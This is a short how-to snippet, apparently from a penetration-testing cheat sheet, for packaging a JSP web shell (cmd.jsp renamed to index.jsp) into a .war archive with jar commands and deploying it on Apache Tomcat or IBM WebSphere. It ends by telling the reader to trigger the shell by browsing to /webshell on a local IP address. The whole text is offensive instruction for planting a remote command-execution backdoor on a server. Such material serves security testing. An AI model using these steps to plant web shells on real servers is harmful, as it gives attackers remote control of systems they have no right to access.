How about .war file for Apache tomcat or IBM websphere,...

Make war file to deploy in Tomcat

Note: `Change cmd.jsp to index.jsp `
```
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
```
How to trigger:
Go to path `/webshell` it will trigger. Ex: http://192.168.1.4:8080/webshell/

![image](https://user-images.githubusercontent.com/24661746/131221623-0041627a-729c-4337-99c5-0b0d13e70d40.png)

